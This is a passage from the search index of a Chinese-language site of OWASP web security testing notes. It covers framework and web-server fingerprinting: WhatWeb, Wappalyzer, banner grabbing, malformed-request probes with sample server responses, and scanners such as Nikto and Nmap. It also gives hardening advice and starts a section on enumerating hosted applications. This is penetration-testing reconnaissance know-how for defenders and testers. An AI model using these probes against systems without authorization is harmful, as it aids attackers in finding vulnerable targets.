%86%E6%9E%B6/#_12","title":"\u5de5\u5177","text":"<p>\u4e0b\u9762\u5217\u51fa\u4e86\u5e38\u7528\u548c\u4f17\u6240\u5468\u77e5\u7684\u5de5\u5177\u3002\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u57fa\u4e8e\u6846\u67b6\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#whatweb","title":"Whatweb","text":"<p>\u7f51\u7ad9\uff1ahttps ://github.com/urbanadventurer/WhatWeb</p> <p>\u76ee\u524d\u5e02\u573a\u4e0a\u6700\u597d\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u4e4b\u4e00\u3002\u5305\u542b\u5728\u9ed8\u8ba4\u7684Kali Linux\u6784\u5efa\u4e2d\u3002\u8bed\u8a00\uff1aRuby \u7528\u4e8e\u6307\u7eb9\u8bc6\u522b\u7684\u5339\u914d\u4f7f\u7528\uff1a</p> <ul> <li>\u6587\u672c\u5b57\u7b26\u4e32\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</li> <li>\u5e38\u7528\u8868\u8fbe</li> <li>Google Hack \u6570\u636e\u5e93\u67e5\u8be2\uff08\u6709\u9650\u7684\u5173\u952e\u5b57\u96c6\uff09</li> <li>MD5 \u54c8\u5e0c</li> <li>\u7f51\u5740\u8bc6\u522b</li> <li>HTML \u6807\u8bb0\u6a21\u5f0f</li> <li>\u7528\u4e8e\u88ab\u52a8\u548c\u4e3b\u52a8\u64cd\u4f5c\u7684\u81ea\u5b9a\u4e49 ruby\u200b\u200b \u4ee3\u7801</li> </ul> <p>\u793a\u4f8b\u8f93\u51fa\u663e\u793a\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff1a</p> <p> \u56fe 4.1.8-8\uff1aWhatweb \u8f93\u51fa\u793a\u4f8b</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#wappalyzer","title":"Wappalyzer","text":"<p>\u7f51\u7ad9\uff1ahttps ://www.wappalyzer.com/</p> <p>Wappalyzer \u6709\u591a\u79cd\u4f7f\u7528\u6a21\u5f0f\uff0c\u5176\u4e2d\u6700\u6d41\u884c\u7684\u53ef\u80fd\u662f Firefox/Chrome \u6269\u5c55\u3002\u5b83\u4eec\u4ec5\u9002\u7528\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u9664\u4e86\u8981\u5728\u6d4f\u89c8\u5668\u4e2d\u52a0\u8f7d\u7684\u9875\u9762\u5916\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\u3002\u5b83\u5b8c\u5168\u5728\u6d4f\u89c8\u5668\u7ea7\u522b\u5de5\u4f5c\uff0c\u5e76\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u7ed9\u51fa\u7ed3\u679c\u3002\u867d\u7136\u6709\u65f6\u5b83\u4f1a\u51fa\u73b0\u8bef\u62a5\uff0c\u4f46\u5728\u6d4f\u89c8\u9875\u9762\u540e\u7acb\u5373\u4e86\u89e3\u4f7f\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u6765\u6784\u5efa\u76ee\u6807\u7f51\u7ad9\u975e\u5e38\u65b9\u4fbf\u3002</p> <p>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u63d2\u4ef6\u7684\u793a\u4f8b\u8f93\u51fa\u3002</p> <p> \u56fe 4.1.8-9\uff1aOWASP \u7f51\u7ad9\u7684 Wappalyzer \u8f93\u51fa</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_13","title":"\u53c2\u8003","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_14","title":"\u767d\u76ae\u4e66","text":"<ul> <li>Saumil Shah\uff1a\u201cHTTP \u6307\u7eb9\u8bc6\u522b\u7b80\u4ecb\u201d</li> <li>Anant Shrivastava\uff1a\u201c\u7f51\u7edc\u5e94\u7528\u6307\u7eb9\u8bc6\u522b\u201d</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"\u6307\u7eb9 Web \u670d\u52a1\u5668","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","title":"\u6982\u62ec","text":"<p>Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u662f\u8bc6\u522b\u8fd0\u884c\u76ee\u6807\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u548c\u7248\u672c\u7684\u4efb\u52a1\u3002\u867d\u7136 Web \u670d\u52a1\u5668\u6307\u7eb9\u901a\u5e38\u5c01\u88c5\u5728\u81ea\u52a8\u5316\u6d4b\u8bd5\u5de5\u5177\u4e2d\uff0c\u4f46\u5bf9\u4e8e\u7814\u7a76\u4eba\u5458\u6765\u8bf4\uff0c\u4e86\u89e3\u8fd9\u4e9b\u5de5\u5177\u5982\u4f55\u5c1d\u8bd5\u8bc6\u522b\u8f6f\u4ef6\u7684\u57fa\u672c\u539f\u7406\u53ca\u5176\u6709\u7528\u7684\u539f\u56e0\u975e\u5e38\u91cd\u8981\u3002</p> <p>\u51c6\u786e\u5730\u53d1\u73b0\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u53ef\u4ee5\u4f7f\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\u7279\u522b\u662f\uff0c\u8fd0\u884c\u6ca1\u6709\u6700\u65b0\u5b89\u5168\u8865\u4e01\u7684\u65e7\u7248\u672c\u8f6f\u4ef6\u7684\u670d\u52a1\u5668\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u5df2\u77e5\u7248\u672c\u7279\u5b9a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u5668\u7684\u7248\u672c\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u53d1\u73b0\u4efb\u4f55\u5df2\u77e5\u6f0f\u6d1e\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u7528\u4e8e Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u7684\u6280\u672f\u5305\u62ec\u6a2a\u5e45\u6293\u53d6\u3001\u5f15\u53d1\u5bf9\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\uff0c\u4ee5\u53ca\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6267\u884c\u4f7f\u7528\u7b56\u7565\u7ec4\u5408\u7684\u66f4\u5f3a\u5927\u7684\u626b\u63cf\u3002\u6240\u6709\u8fd9\u4e9b\u6280\u672f\u8fd0\u4f5c\u7684\u57fa\u672c\u524d\u63d0\u662f\u76f8\u540c\u7684\u3002\u4ed6\u4eec\u90fd\u52aa\u529b\u4ece Web \u670d\u52a1\u5668\u4e2d\u5f15\u51fa\u4e00\u4e9b\u54cd\u5e94\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u54cd\u5e94\u4e0e\u5df2\u77e5\u54cd\u5e94\u548c\u884c\u4e3a\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u4e0e\u5df2\u77e5\u7684\u670d\u52a1\u5668\u7c7b\u578b\u76f8\u5339\u914d\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","title":"\u6a2a\u5e45\u6293\u53d6","text":"<p>\u6a2a\u5e45\u6293\u53d6\u662f\u901a\u8fc7\u5411 Web \u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u5e76\u68c0\u67e5\u5176\u54cd\u5e94\u6807\u5934\u6765\u6267\u884c\u7684\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u5de5\u5177\u6765\u5b8c\u6210\uff0c\u5305\u62ec<code>telnet</code>HTTP \u8bf7\u6c42\u6216<code>openssl</code>\u901a\u8fc7 TLS/SSL \u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \"75-591d1d21b6167\"\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n</code></pre> <p>\u8fd9\u662f\u53e6\u4e00\u4e2a\u54cd\u5e94\uff0c\u8fd9\u6b21\u6765\u81ea nginx\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \"5d71489a-75\"\nAccept-Ranges: bytes\n...\n</code></pre> <p>\u8fd9\u662f\u6765\u81ea lighttpd \u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\"\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n</code></pre> <p>\u5728\u8fd9\u4e9b\u4f8b\u5b50\u4e2d\uff0c\u670d\u52a1\u5668\u7c7b\u578b\u548c\u7248\u672c\u88ab\u6e05\u695a\u5730\u66b4\u9732\u4e86\u3002\u4f46\u662f\uff0c\u6ce8\u91cd\u5b89\u5168\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u901a\u8fc7\u4fee\u6539\u6807\u5934\u6765\u6df7\u6dc6\u5176\u670d\u52a1\u5668\u4fe1\u606f\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u662f\u5bf9\u5177\u6709\u4fee\u6539\u6807\u5934\u7684\u7ad9\u70b9\u8bf7\u6c42\u7684\u54cd\u5e94\u7684\u6458\u5f55\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n</code></pre> <p>\u5728\u670d\u52a1\u5668\u4fe1\u606f\u6a21\u7cca\u4e0d\u6e05\u7684\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u6839\u636e\u6807\u5934\u5b57\u6bb5\u7684\u987a\u5e8f\u731c\u6d4b\u670d\u52a1\u5668\u7684\u7c7b\u578b\u3002\u8bf7\u6ce8\u610f\uff0c\u5728\u4e0a\u9762\u7684 Apache \u793a\u4f8b\u4e2d\uff0c\u5b57\u6bb5\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u65e5\u671f</li> <li>\u670d\u52a1\u5668</li> <li>\u6700\u540e\u4fee\u6539</li> <li>\u7535\u5b50\u6807\u7b7e</li> <li>\u63a5\u53d7\u8303\u56f4</li> <li>\u5185\u5bb9\u957f\u5ea6</li> <li>\u8054\u7cfb</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u4f46\u662f\uff0c\u5728 nginx \u548c\u6a21\u7cca\u670d\u52a1\u5668\u793a\u4f8b\u4e2d\uff0c\u5171\u540c\u7684\u5b57\u6bb5\u90fd\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u670d\u52a1\u5668</li> <li>\u65e5\u671f</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u731c\u6d4b\u88ab\u906e\u6321\u7684\u670d\u52a1\u5668\u662fnginx\u3002\u4f46\u662f\uff0c\u8003\u8651\u5230\u591a\u4e2a\u4e0d\u540c\u7684Web\u670d\u52a1\u5668\u53ef\u80fd\u5171\u4eab\u76f8\u540c\u7684\u5b57\u6bb5\u987a\u5e8f\u5e76\u4e14\u53ef\u4ee5\u4fee\u6539\u6216\u5220\u9664\u5b57\u6bb5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u4e0d\u786e\u5b9a\u7684\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","title":"\u53d1\u9001\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42","text":"<p>Web \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5b83\u4eec\u7684\u9519\u8bef\u54cd\u5e94\u6765\u8bc6\u522b\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u6ca1\u6709\u88ab\u5b9a\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u3002\u5f3a\u5236\u670d\u52a1\u5668\u5448\u73b0\u8fd9\u4e9b\u5185\u5bb9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u6545\u610f\u53d1\u9001\u4e0d\u6b63\u786e\u6216\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9<code>SANTA CLAUS</code>\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u4e0d\u5b58\u5728\u65b9\u6cd5\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;400 Bad Request&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Bad Request&lt;/h1&gt;\n&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea nginx \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;\n&lt;hr&gt;&lt;center&gt;nginx/1.17.3&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea lighttpd \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n&lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n &lt;head&gt;\n  &lt;title&gt;400 Bad Request&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n  &lt;h1&gt;400 Bad Request&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7531\u4e8e\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u5728\u4e0d\u540c\u7c7b\u578b\u7684 Web \u670d\u52a1\u5668\u4e4b\u95f4\u63d0\u4f9b\u4e86\u8bb8\u591a\u533a\u5206\u56e0\u7d20\uff0c\u56e0\u6b64\u5373\u4f7f\u5728\u670d\u52a1\u5668\u6807\u5934\u5b57\u6bb5\u88ab\u906e\u76d6\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u68c0\u67e5\u4e5f\u53ef\u4ee5\u6210\u4e3a\u6307\u7eb9\u8bc6\u522b\u7684\u6709\u6548\u65b9\u6cd5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","title":"\u4f7f\u7528\u81ea\u52a8\u626b\u63cf\u5de5\u5177","text":"<p>\u5982\u524d\u6240\u8ff0\uff0cWeb \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u901a\u5e38\u4f5c\u4e3a\u81ea\u52a8\u626b\u63cf\u5de5\u5177\u7684\u4e00\u9879\u529f\u80fd\u5305\u542b\u5728\u5185\u3002\u8fd9\u4e9b\u5de5\u5177\u80fd\u591f\u53d1\u51fa\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u6f14\u793a\u7684\u8bf7\u6c42\uff0c\u4ee5\u53ca\u53d1\u9001\u5176\u4ed6\u66f4\u7279\u5b9a\u4e8e\u670d\u52a1\u5668\u7684\u63a2\u6d4b\u3002\u81ea\u52a8\u5316\u5de5\u5177\u53ef\u4ee5\u6bd4\u624b\u52a8\u6d4b\u8bd5\u66f4\u5feb\u5730\u6bd4\u8f83\u6765\u81ea Web \u670d\u52a1\u5668\u7684\u54cd\u5e94\uff0c\u5e76\u5229\u7528\u5df2\u77e5\u54cd\u5e94\u7684\u5927\u578b\u6570\u636e\u5e93\u6765\u5c1d\u8bd5\u8bc6\u522b\u670d\u52a1\u5668\u3002\u7531\u4e8e\u8fd9\u4e9b\u539f\u56e0\uff0c\u81ea\u52a8\u5316\u5de5\u5177\u66f4\u6709\u53ef\u80fd\u4ea7\u751f\u51c6\u786e\u7684\u7ed3\u679c\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5305\u542b Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u529f\u80fd\u7684\u5e38\u7528\u626b\u63cf\u5de5\u5177\u3002</p> <ul> <li>Netcraft\uff0c\u4e00\u79cd\u626b\u63cf\u7f51\u7ad9\u4fe1\u606f\uff08\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\uff09\u7684\u5728\u7ebf\u5de5\u5177\u3002</li> <li>Nikto\uff0c\u4e00\u79cd\u5f00\u6e90\u547d\u4ee4\u884c\u626b\u63cf\u5de5\u5177\u3002</li> <li>Nmap\uff0c\u4e00\u4e2a\u5f00\u6e90\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e5f\u6709\u4e00\u4e2a GUI\uff0cZenmap\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u672c\u8eab\u4e0d\u4e00\u5b9a\u662f\u6f0f\u6d1e\uff0c\u4f46\u5b83\u662f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5229\u7528\u53ef\u80fd\u5b58\u5728\u7684\u5176\u4ed6\u6f0f\u6d1e\u7684\u4fe1\u606f\u3002\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u8fd8\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u627e\u5230\u7279\u5b9a\u4e8e\u7248\u672c\u7684\u670d\u52a1\u5668\u6f0f\u6d1e\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u7528\u4e8e\u5229\u7528\u672a\u6253\u8865\u4e01\u7684\u670d\u52a1\u5668\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u8fd9\u4e9b\u884c\u52a8\u5305\u62ec\uff1a</p> <ul> <li>\u9690\u85cf\u6807\u5934\u4e2d\u7684 Web \u670d\u52a1\u5668\u4fe1\u606f\uff0c\u4f8b\u5982\u4f7f\u7528 Apache \u7684mod_headers \u6a21\u5757\u3002</li> <li>\u4f7f\u7528\u52a0\u56fa\u7684\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u5728 Web \u670d\u52a1\u5668\u548c Internet \u4e4b\u95f4\u521b\u5efa\u989d\u5916\u7684\u5b89\u5168\u5c42\u3002</li> <li>\u786e\u4fdd Web \u670d\u52a1\u5668\u4e0e\u6700\u65b0\u7684\u8f6f\u4ef6\u548c\u5b89\u5168\u8865\u4e01\u4fdd\u6301\u540c\u6b65\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/","title":"\u6388\u6743\u6d4b\u8bd5","text":"<p>4.5.1\u6d4b\u8bd5\u76ee\u5f55\u904d\u5386\u6587\u4ef6\u5305\u542b</p> <p>4.5.2\u7ed5\u8fc7\u6388\u6743\u6a21\u5f0f\u7684\u6d4b\u8bd5</p> <p>4.5.3 \u63d0\u6743\u6d4b\u8bd5</p> <p>4.5.4\u6d4b\u8bd5\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528</p> <p>4.5.5\u6d4b\u8bd5 OAuth \u5f31\u70b9</p> <p>4.5.5.1\u6d4b\u8bd5 OAuth \u6388\u6743\u670d\u52a1\u5668\u5f31\u70b9</p> <p>4.5.5.2\u6d4b\u8bd5 OAuth \u5ba2\u6237\u7aef\u5f31\u70b9</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_1","title":"\u6982\u62ec","text":"<p>\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u7684\u6700\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u51fa Web \u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u4e86\u54ea\u4e9b\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u5df2\u77e5\u7684\u6f0f\u6d1e\u548c\u5df2\u77e5\u7684\u653b\u51fb\u7b56\u7565\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u548c\u653b\u51fb\u7b56\u7565\u6765\u83b7\u5f97\u8fdc\u7a0b\u63a7\u5236\u6216\u5229\u7528\u6570\u636e\u3002\u6b64\u5916\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ecf\u5e38\u914d\u7f6e\u9519\u8bef\u6216\u672a\u66f4\u65b0\uff0c\u56e0\u4e3a\u4eba\u4eec\u8ba4\u4e3a\u5b83\u4eec\u4ec5\u5728\u201c\u5185\u200b\u200b\u90e8\u201d\u4f7f\u7528\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u5a01\u80c1\u200b\u200b\u3002\u968f\u7740\u865a\u62df Web \u670d\u52a1\u5668\u7684\u6fc0\u589e\uff0cIP \u5730\u5740\u548c Web \u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u7edf\u7684 1:1 \u5173\u7cfb\u6b63\u5728\u5931\u53bb\u5176\u539f\u6709\u7684\u5927\u90e8\u5206\u610f\u4e49\u3002\u591a\u4e2a\u7f51\u7ad9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u7b26\u53f7\u540d\u79f0\u89e3\u6790\u4e3a\u540c\u4e00 IP \u5730\u5740\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002\u8fd9\u79cd\u573a\u666f\u4e0d\u4ec5\u9650\u4e8e\u6258\u7ba1\u73af\u5883\uff0c\u4e5f\u9002\u7528\u4e8e\u666e\u901a\u7684\u4f01\u4e1a\u73af\u5883\u3002</p> <p>\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u6709\u65f6\u4f1a\u83b7\u5f97\u4e00\u7ec4 IP \u5730\u5740\u4f5c\u4e3a\u6d4b\u8bd5\u76ee\u6807\u3002\u6709\u4e89\u8bae\u7684\u662f\uff0c\u6b64\u573a\u666f\u66f4\u7c7b\u4f3c\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7c7b\u578b\u7684\u53c2\u4e0e\uff0c\u4f46\u65e0\u8bba\u5982\u4f55\uff0c\u9884\u8ba1\u6b64\u7c7b\u4efb\u52a1\u5c06\u6d4b\u8bd5\u53ef\u901a\u8fc7\u6b64\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u95ee\u9898\u662f\u7ed9\u5b9a\u7684 IP \u5730\u5740\u5728\u7aef\u53e3 80 \u4e0a\u6258\u7ba1 HTTP \u670d\u52a1\uff0c\u4f46\u662f\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u901a\u8fc7\u6307\u5b9a IP \u5730\u5740\uff08\u8fd9\u662f\u4ed6\u4eec\u6240\u77e5\u9053\u7684\uff09\u8bbf\u95ee\u5b83\uff0c\u5b83\u4f1a\u62a5\u544a\u201c\u6b64\u5730\u5740\u672a\u914d\u7f6e Web \u670d\u52a1\u5668\u201d\u6216\u7c7b\u4f3c\u6d88\u606f.\u00a0\u4f46\u662f\u8be5\u7cfb\u7edf\u53ef\u4ee5\u201c\u9690\u85cf\u201d\u8bb8\u591a\u4e0e\u4e0d\u76f8\u5173\u7684\u7b26\u53f7 (DNS) \u540d\u79f0\u5173\u8054\u7684 Web 